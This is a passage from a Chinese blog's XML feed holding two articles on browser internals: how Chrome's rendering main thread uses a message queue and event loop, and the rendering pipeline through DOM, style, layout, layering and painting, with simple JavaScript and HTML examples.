    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/</url>
    
    <content type="html"><![CDATA[<p>前面我们讲到了每个渲染进程都有一个主线程，并且主线程非常繁忙，既要处理 DOM，又要计算样式，还要处理布局，同时还需要处理 JavaScript 任务以及各种输入事件。要让这么多不同类型的任务在主线程中有条不紊地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是我们今天要讲的消息队列和事件循环系统。</p><h2 id="使用单线程处理安排好的任务"><a href="#使用单线程处理安排好的任务" class="headerlink" title="使用单线程处理安排好的任务"></a>使用单线程处理安排好的任务</h2><p>我们先从最简单的场景讲起，比如有如下一系列的任务：</p><ul><li>任务 1：1+2</li><li>任务 2：20/5</li><li>任务 3：7*8</li><li>任务 4：打印出任务 1、任务 2、任务 3 的运算结果</li></ul><p>现在要在一个线程中去执行这些任务，通常我们会这样编写代码：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MainThread</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-keyword">const</span> num1 = <span class="hljs-number">1</span>+<span class="hljs-number">2</span>; <span class="hljs-comment">//任务1</span>     <span class="hljs-keyword">const</span> num2 = <span class="hljs-number">20</span>/<span class="hljs-number">5</span>; <span class="hljs-comment">//任务2</span>     <span class="hljs-keyword">const</span> num3 = <span class="hljs-number">7</span>*<span class="hljs-number">8</span>; <span class="hljs-comment">//任务3</span>     <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;最终计算的值为:&quot;</span>,num,num2,num3)； <span class="hljs-comment">//任务4</span>&#125;</code></pre><p>在上面的执行代码中，我们把所有任务代码按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，线程会自动退出。可以参考下图来直观地理解下其执行过程：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img.png" class=""><p>第一版：线程的一次执行</p><h2 id="在线程运行过程中处理新任务"><a href="#在线程运行过程中处理新任务" class="headerlink" title="在线程运行过程中处理新任务"></a>在线程运行过程中处理新任务</h2><p>但是呢，实际情况并不是所有的任务都是在执行之前统一安排好的，大部分情况下，新的任务是在线程运行过程中产生的。比如在线程执行的过程中，又接收到了一个新的任务要求计算 “10 + 2” ，那这种方式就无法处理这种情况。</p><p>那么我们如果想处理这种情况，就需要把上面这个过程循环起来。具体来说，<strong>就是要在线程运行过程中，能接收并执行新任务，这样就需要采用事件循环机制。</strong></p><p>最简单的就是使用一个for循环来监听是否有新的任务，如下面的示例代码：</p><pre><code class="hljs jsx"><span class="hljs-comment">//getInput</span><span class="hljs-comment">//等待用户从键盘输入一个数字，并返回该输入的数字</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInput</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// ...</span>    <span class="hljs-keyword">return</span> input_number;&#125;<span class="hljs-comment">//主线程(Main Thread)</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MainThread</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-keyword">for</span>(;;)&#123;          <span class="hljs-keyword">const</span> first_num = getInput()；          <span class="hljs-keyword">const</span> second_num = getInput()；          result_num = first_num + second_num;          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;最终计算的值为:%d&quot;</span>,result_num)；      &#125;&#125;</code></pre><p> 相较于第一版的线程，这一版的线程做了两点改进。</p><ul><li><strong>第一点引入了循环机制</strong>，具体的实现就是加了一个for循环，线程会一直循环执行。</li><li><strong>第二点引入了事件</strong>，可以在线程运行过程中，等待用户输入的数字，等待过程中线程处于暂停阶段，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。</li></ul><p>通过引入事件循环机制，就可以让该线程“活”起来了。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img1.png" class=""><p>第二版：在线程中引入事件循环</p><h2 id="处理其他线程发送过来的任务"><a href="#处理其他线程发送过来的任务" class="headerlink" title="处理其他线程发送过来的任务"></a>处理其他线程发送过来的任务</h2><p>上面我们改进了线程的执行方式，引入了事件循环机制，可以让其在执行过程中接收新的的任务。不过在第二版的线程模型中，所有的任务都是来自线程内部的，如果另一个线程想让这个线程执行一个任务，上面这种线程模型是无法做到的。</p><p>那么下面我们就来看看其他线程是如何发送消息给渲染主线程的。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img2.png" class=""><p>渲染进程线程之间发送任务</p><p>在这个图里可以看出，渲染主进程会频繁收到IO线程的一些任务，接收到这些任务之后，渲染主进程就要处理这些任务。</p><p>比如，收到资源加载完成的消息后，渲染主进程就要开始进行DOM解析了；收到鼠标点击的消息后，渲染主进程就要开始执行相应的JS脚本来处理该点击事件。</p><p>那么如何设计好一个线程模型，能让其能够接收其他线程发送的消息呢？</p><p>一个通用模式是使用<strong>消息队列</strong>。在解释如何实现之前，我们先说说什么是消息队列。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img3.png" class=""><p><strong>消息队列是一种数据结构，可以存放要执行的任务。</strong></p><p>它符合队列“<strong>先进先出</strong>”的特点。也就是说要添加任务的话，会被添加到队列的尾部；要取任务的话，会从队列的头部取。</p><p>有了队列之后，我们就可以继续改造线程模型了，改造方案如下。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img4.png" class=""><p>第三版线程模型：队列 + 循环</p><p>从图中可以看出，我们的改造可以分为三个步骤：</p><ol><li>添加一个消息队列</li><li>IO 线程中产生的新任务会添加进消息队列的尾部</li><li>渲染主线程会循环的从消息队列头部读取任务，执行任务</li></ol><p>那么我们现在就可以来改造第三版的线程模型了。</p><p>首先，构造一个队列。</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> taskQueue = [];</code></pre><p>然后，我们再改造主线程，让主线程从队列中读取任务：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MainThread</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">for</span>(;;)&#123;    <span class="hljs-keyword">const</span> task = taskQueue.shift();        <span class="hljs-keyword">if</span> (task) &#123;                ProcessTask(task);        &#125;  &#125;&#125;</code></pre><p>在这段代码中，我们添加了一个消息队列的数组，然后在主线程的 for 循环中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行。所以只要消息队列中有任务，主线程就会去执行。</p><p>主线程的代码就这样改造完了。这样改造后，主线程执行的任务都全部从消息队列中获取。<strong>所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了</strong>，添加任务的代码如下：</p><pre><code class="hljs jsx">taskQueue.push(Task)</code></pre><p>另外，由于是多个线程操作同一个消息队列，所以在添加任务和取出任务的时候还会加上一个同步锁。关于锁呢，在JS的单线程环境下我们基本不会碰到，有兴趣的同学可以了解一下。</p><h2 id="处理其他进程发送过来的任务"><a href="#处理其他进程发送过来的任务" class="headerlink" title="处理其他进程发送过来的任务"></a>处理其他进程发送过来的任务</h2><p>通过消息队列，我们实现了线程之间的消息通讯。在 Chrome 中，跨进程之间的任务也是频繁发生的，那么进程之间是如何通讯的呢？</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img5.png" class=""><p>跨进程发送消息</p><p><strong>渲染进程里有个专门的 IO 线程用来接收其他进程传进来的消息</strong>。接收到消息后，它会将这些消息组装成任务发送给渲染主进程。后面的步骤就是我们刚才将的那些。</p><h2 id="消息队列中的任务类型"><a href="#消息队列中的任务类型" class="headerlink" title="消息队列中的任务类型"></a>消息队列中的任务类型</h2><p>那么消息队列中的任务是有很多中类型的，比如：输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JS定时器等。具体的类型可以参考chromium源码</p><p><a href="https://cs.chromium.org/chromium/src/third_party/blink/public/platform/task_type.h"></a></p><p>除此之外，消息队列还包含了很多与页面相关的事件，比如：JS的执行、解析DOM、样式计算、布局计算、CSS动画等。</p><p>以上这些事件都是在主线程里去执行的。</p><h2 id="如何安全退出队列循环？"><a href="#如何安全退出队列循环？" class="headerlink" title="如何安全退出队列循环？"></a>如何安全退出队列循环？</h2><p>这里还有一个场景需要处理，当页面被关掉的时候，怎么才能退出这个循环呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个变量，在每次执行完一个任务的时候，就去判断这个变量是不是需要退出。那么具体的代码如下：</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> taskQueue = [];<span class="hljs-keyword">let</span> keep_running = <span class="hljs-literal">true</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MainThread</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">for</span>(;;)&#123;    <span class="hljs-keyword">const</span> task = taskQueue.shift();        <span class="hljs-keyword">if</span> (task) &#123;                ProcessTask(task);        &#125;        <span class="hljs-keyword">if</span>(!keep_running) <span class="hljs-comment">//如果设置了退出标志，那么直接退出线程循环</span>        <span class="hljs-keyword">break</span>;  &#125;&#125;</code></pre><h2 id="消息队列的问题"><a href="#消息队列的问题" class="headerlink" title="消息队列的问题"></a>消息队列的问题</h2><p>上面整个的过程就是页面线程的循环系统的工作流程。这个时候你应该清楚了，页面所有执行的任务都来消息队列。消息队列是“先进先出”的属性，但是呢，“先进先出”有两个问题需要解决。</p><ol><li><p><strong>第一个问题是如何处理高优先级的任务</strong></p><p> 比如一个典型的场景就是监控DOM节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计是，用JS设计一套监听接口，当发生变化时，渲染引擎同步调用这些接口，这个是个典型的观察者模式。</p><p> 但是当 DOM 的变化非常频繁的时候，当前的任务执行时间会被拉长，它的执行效率会下降。那么如果将这些DOM的变化做成异步的事件，那么又会影响到监听的实时性。那么怎么去<strong>平衡效率和实时性</strong>呢？</p><p> 这个时候，就出现了微任务。下面我们来看看微任务是如何权衡效率和实时性的。</p><p> 通常我们把消息队列中的任务称为<strong>宏任务</strong>，每个宏任务中都包含了一个<strong>微任务队列</strong>，在执行宏任务的过程中，如果DOM有变化，那么就会将该变化添加到微任务列表中，这样将不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。</p><p> 等宏任务中的任务都执行完成了之后，渲染引擎并不着急去执行下一个宏任务，而是先执行当前宏任务中的微任务，因为DOM变化的事件都保存在这些微任务队列中，这样也解决了实时性问题。</p></li><li><p><strong>第二个问题是如何解决单个任务执行时间多久的问题</strong></p><p> 因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。这样就会引起卡顿的感觉。</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img6.png" class=""><p> 单个任务执行时间过久</p></li></ol><p>关于宏任务和微任务，我在后面会有详细的文章进行分析。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器渲染流程</title>
    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>上一篇文章介绍了浏览器导航相关的流程，不过导航流程结束后，页面是白屏。因为此时渲染流程还没开始，页面内容还没有被渲染出来。这篇文章我们来仔细了解一下渲染流程。</p><p>渲染阶段非常重要，也是浏览器里最核心和最复杂的模块之一。了解其相关流程能让你“看透”页面是如何工作的，有了这些知识，你可以解决一系列相关的问题，比如能熟练使用开发者工具，因为能够理解开发者工具里面大部分项目的含义，能优化页面卡顿问题，使用 JavaScript 优化动画流程，通过优化样式表来防止强制同步布局等等。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img.png" class=""><p>由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。我们把这样的一个处理流程叫做渲染流水线，其大致流程如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img1.png" class=""><p>这里的子阶段的概念相当于一个函数：</p><ul><li>开始每个子阶段都有其输入的内容。</li><li>然后每个子阶段有其处理过程。</li><li>最终每个子阶段会生成输出内容。</li></ul><p>渲染流程有下面几个子阶段：</p><ol><li>构建 DOM 树</li><li>样式计算</li><li>布局阶段</li><li>分层</li><li>绘制</li><li>分块</li><li>光栅化和合成</li></ol><p>内容比较多，下面我就来详细讲解各个子阶段。</p><h2 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h2><p>第一步是构建 DOM 树。关于 DOM 树构建的原理，我在这篇文章中已经有详细的介绍。这里不做详细分析。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img2.png" class=""><p>从图中可以看出，构建 DOM 树的输入内容是一个 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。</p><p>现在已经生成 DOM 树了，不过 DOM 节点的样式我们依然不知道，下一步就是获取样式。</p><h2 id="样式计算（Recalculate-Style）"><a href="#样式计算（Recalculate-Style）" class="headerlink" title="样式计算（Recalculate Style）"></a>样式计算（Recalculate Style）</h2><p>样式计算的目的是为了计算出 DOM 节点中每个元素的具体样式。</p><p>CSS 规则的来源一共三种：CSS 文件外联、 Style 标签、行内样式。外联的 CSS 文件是当下载完成后就开始解析，并解析成 styleSheets。我们可以在浏览器中看到它的结构，在控制台输入document.styleSheets：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img3.png" class=""><p>Style 标签和行内样式是在 DOM 解析的时候收集的。最后将上面收集的三种 CSS 规则，另外加上浏览器内置的默认规则（user agent stylesheet ），一共四种，根据继承和叠加规则计算每个 DOM 节点的样式，并被保存在 ComputedStyle 的结构内。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img4.png" class=""><p>关于 CSS 的解析和计算，我在这篇问题中有更详细的介绍。</p><p>这里还有个非常重要的关键点：<strong>什么时候开始计算 CSS 规则？</strong></p><p>是 DOM 解析完之后吗？还是 CSS 文件解析完之后？这里的关键点是什么时候可以收集完所有的 CSS 规则。</p><p>如果按照标准的 HTML 结构写法，Link CSS 和 Style 标签写在 Head 标签内。那么在解析完一个 DOM 节点的开始标签时（行内样式都是写在开始标签里的），上述的四种来源的规则就都收集完了。所以在正常情况下，HTML 解析器解析完一个 DOM 节点后就开始计算 CSS 规则了。</p><p>如果不是标准写法会怎么处理呢？比如 Style 标签写在 Body 里面，那么在解析到 Body 里的 Style 标签后会重新计算 CSS 规则。所以非标准的 HTML 结构可能会降低性能。</p><p>注意，这里计算的是当前 DOM 节点的规则。当解析完当前 DOM 节点时，它的父节点已经解析完了，样式也计算好了。而此时就已经满足选择器和权重等规则的解析了。现在 CSS 的选择器里都是父元素选下面的子元素，无法让子元素选择父元素。所以当一个元素的父元素都解析完成后，当前元素的 CSS 规则就可以计算出来。</p><p>如果出现了子元素选择父元素的选择器，就必须重写这里的解析规则。而 CSS4 中包含了子元素选择父元素的选择器，这也是为何 CSS4 出来这么久，各大浏览器还没有适配的原因之一。</p><p>另外，如果外联的 CSS 文件下载超时了，原则上会阻塞 CSS 的计算。但是浏览器有一些容错机制，下载超时后，均采用 user agent stylesheet 默认样式进行渲染，虽然丑点，但是最起码页面可以展示出来。</p><h2 id="布局阶段"><a href="#布局阶段" class="headerlink" title="布局阶段"></a>布局阶段</h2><p>现在已经有 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为我们还不知道 DOM 元素的几何位置信息。<strong>那么接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局。</strong></p><p>Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。</p><ol><li><p><strong>创建布局树（LayoutTree）</strong></p><p> 你可能注意到了 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以在显示之前，我们还要额外地构建一棵只包含可见元素布局树。你们可能听说过渲染树，和这里的布局树是一个意思。具体的做法就是遍历DOM树，将可见元素添加到布局树中。同时合并样式。图里你可以看到，最后生成的布局树没有包含不可见的节点。</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img5.png" class=""><p> 布局树构造过程示意图</p></li><li><p><strong>布局计算</strong></p></li></ol><p>现在我们有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置了。布局的计算过程非常复杂。</p><p>CSS 的布局发展到现在，一共有三种：正常流布局、Flex 布局、Grid 布局。正常流布局虽然名字叫“正常”，但是它却是这三种布局里最不正常的，正常流布局的”三大难题“可是绞尽了那个时代前端工程师的脑汁。 Flex 布局是现在最主流的布局，可以比较轻松的处理正常流布局中很难实现的功能，另外移动端中也主要用 Flex 布局。Grid 布局功能很强大，但是学习成本偏高，兼容性也不太好，但在未来可能有成为主流的可能。</p><p>在 CSS 中，我们一定听说过一个概念叫 “盒模型” ，一个“盒（box）”就是通过一个 DOM 节点的 width、height、margin、padding、border 等 CSS 规则计算出来的。另外，如果这个节点元素带有伪元素，其伪元素也会产生“盒”。“盒”的类型有很多种，比如：line-box、block-box、linline-box 等。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img6.png" class=""><p>在 Blink（Chrome 的渲染引擎）的源码注释里面，很形象地画出了盒模型图（连滚动条都画出来了）。有了这一个个盒，浏览器就需要将这些盒像活字印刷术那样，按照规则排列起来，也叫”排版“。</p><p>具体怎么排就要根据 CSS 规则规定的行为去计算。最终需要精确的计算每个元素的确切位置和尺寸，这里所有的相对测量值都会转为屏幕上的绝对像素。</p><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><p>现在我们有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？还差一点。</p><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-index 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）</strong>。这个图层和PS里的图层差不多，那么最终的图像就是这些图层叠加在一起构成的。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img7.png" class=""><p>布局树和图层树关系示意图</p><p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层。</strong>如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p><p>那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</p><ol><li><p><strong>拥有层叠上下文属性</strong></p><p> 我们知道有一个css属性叫 z-index。z-index 就是从图层外面到里面有一个z轴，它的值会影响这些层的渲染顺序。</p><p> 那么文档中的层叠上下文由满足以下任意一个条件的元素形成：</p><ul><li><p>文档根元素（<code>&lt;html&gt;</code>）；</p></li><li><p><code>[position]</code> 值为 <code>absolute</code>（绝对定位）或 <code>relative</code>（相对定位）且 <code>[z-index]</code> 值不为 <code>auto</code> 的元素；</p></li><li><p><code>[position]</code> 值为 <code>fixed</code>（固定定位）或 <code>sticky</code>（粘滞定位）的元素（沾滞定位适配所有移动设备上的浏览器，但老的桌面浏览器不支持）；</p></li><li><p>flex (<code>flexbox</code>) 容器的子元素，且 <code>[z-index]</code> 值不为 <code>auto</code>；</p></li><li><p>grid (<code>[grid]</code>) 容器的子元素，且 <code>[z-index]</code> 值不为 <code>auto</code>；</p></li><li><p><code>[opacity]</code> 属性值小于 <code>1</code> 的元素；</p></li><li><p><code>[mix-blend-mode]</code> 属性值不为 <code>normal</code> 的元素；【元素的内容应该与元素的直系父元素的内容和元素的背景如何混合】</p></li><li><p>以下任意属性值不为 <code>none</code> 的元素：</p><ul><li><code>[transform]</code></li><li><code>[filter]</code></li><li><code>[perspective]</code>【使具有三维位置变换的元素产生透视效果】</li><li><code>[clip-path]</code>【创建一个剪切区域】</li><li><code>[mask]</code> / <code>[mask-image]</code> / <code>[mask-border]</code></li></ul></li><li><p><code>[isolation]</code> 属性值为 <code>isolate</code> 的元素；【是否必须创建一个新的层叠上下文】</p></li><li><p><code>[will-change]</code> 值设定了任一属性而该属性在 non-initial 值时会创建层叠上下文的元素；</p></li><li><p><code>[-webkit-overflow-scrolling]</code> 属性值为 <code>touch</code> 的元素；【在移动端是否使用滚动回弹效果，但是基本没有浏览器支持这个属性】</p></li><li><p><code>[contain]</code> 属性值为 <code>layout</code>、<code>paint</code> 或包含它们其中之一的合成值（比如 <code>contain: strict</code>、<code>contain: content</code>）的元素。</p><p>在层叠上下文中，子元素同样也按照上面解释的规则进行层叠。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img8.png" class=""><p>上图的结构如下：</p></li><li><p>Root</p><ul><li>DIV #1</li><li>DIV #2</li><li>DIV #3<ul><li>DIV #4</li><li>DIV #5</li><li>DIV #6</li></ul></li></ul><p>这里需要注意，DIV #1 的 z-index 值最大，是5，所以它的层级在最上面。DIV #2最小，在最下面。</p><p>DIV #4，DIV #5 和 DIV #6 是 DIV #3 的子元素，所以它们的层叠完全在 DIV #3 中被处理。也就是说DIV #3 和它的所有子元素是在同一个层级上的，子元素的z-index是没有意义的。他们整体的z-index是4，所以要放在 DIV #1 的下面。</p></li></ul><p> <strong>其子级层叠上下文的 z-index 值只在父级中才有意义</strong>。<strong>子级层叠上下文被自动视为父级层叠上下文的一个独立单元。</strong></p></li><li><p><strong>需要剪裁（clip）的地方也会被创建为图层。</strong></p><p> 裁剪是什么意思呢？简单来说就是内容溢出。</p> <pre><code class="hljs jsx">&lt;style&gt;   div &#123;         width: <span class="hljs-number">200</span>;         height: <span class="hljs-number">200</span>;         overflow:auto;         **background: gray;**     &#125;&lt;/style&gt;&lt;body&gt; &lt;div &gt;     &lt;p&gt;所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：&lt;/p&gt;     &lt;p&gt;从上图我们可以看到，<span class="hljs-built_in">document</span>层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。&lt;/p&gt;     &lt;p&gt;图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;</code></pre><p> 出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img9.png" class=""><p> 被裁剪的内容会出现在单独一层</p></li></ol><p>所以说，元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。</p><p>我们再通过一个例子来看看渲染引擎的分层机制。</p><p>首先要问一个问题，屏幕是怎么显示图像的？我们人眼看到的，就是一张图片，准确来说，它是一张位图。它为什么能动呢？是因为这个图片再不断的被刷新。一般的屏幕会每秒更新60张图片，也就是我们常说的60HZ。HZ就是帧率的单位。每秒60张，也就是16.6毫秒左右一张图片，这个对于性能的要求是很高的，如果不做什么优化的话，用户就很容易感到卡顿。要解决卡顿的问题，就要解决每帧生成时间过久的问题。为了解决这个问题，Chrome 对渲染方式做了大量的工作，其中有效的策略就是引入了分层和合成机制。</p><p>Chrome 的分层和合成是当今最先进的渲染技术。Chrome 中的合成技术，可以用三个词来概括总结：分层、分块和合成。</p><p>通常一个页面的组成是非常复杂的，有的页面里要实现一些复杂的动画效果，比如点击、选中，还有一些炫酷的3D动画效果。我们刚才讲了我们看到的就是一张图片，如果我点了一个按钮，然后有个动画效果，就把整张图片重新生成，那这显然渲染效率就太低了，会导致卡顿。</p><p>那分层是什么呢？你可以把一个网页想象成是由多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终会将这些图层合成一张图片，然后显示出来。大家应该用过ps吧，ps里的图层。就和我说的这个图层比较像。每个图层可以设置透明度、阴影、渐变等，也可以旋转或者设置图层的上下位置。在这个过程中，将素材分解为多个图层的操作就称为分层，最后将这些图层合并到一起的操作就称为合成。所以，分层和合成通常是一起使用的。</p><p>当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。</p><h2 id="图层绘制"><a href="#图层绘制" class="headerlink" title="图层绘制"></a>图层绘制</h2><p>在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，那么接下来我们看看渲染引擎是怎么实现图层绘制的？</p><p>比如说，让你画这样一张图。它的背景是蓝色，然后在中间位置画一个红色的圆，最后再在圆上画个绿色三角形。你会怎么操作呢？</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img10.png" class=""><p>通常，你会把你的绘制操作分解为三步：</p><ol><li>绘制蓝色背景；</li><li>在中间绘制一个红色的圆；</li><li>再在圆上绘制绿色三角形；</li></ol><p>渲染引擎实现图层的绘制与之类似，会把一个图层的绘制拆分成很多小的绘制指令，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img11.png" class=""><p>绘制列表</p><p>从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。</p><p>你也可以打开“开发者工具”的“Layers”标签，选择“document”层，来实际体验下绘制列表，如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img12.png" class=""><p>一个图层的绘制列表</p><p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p><p>在绘制图层的时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——纹理上传，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。为了解决这个问题，Chrome 又采取了一个策略：在首次合成图块的时候使用一个低分辨率的图片。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好。</p><h2 id="栅格化（raster）操作"><a href="#栅格化（raster）操作" class="headerlink" 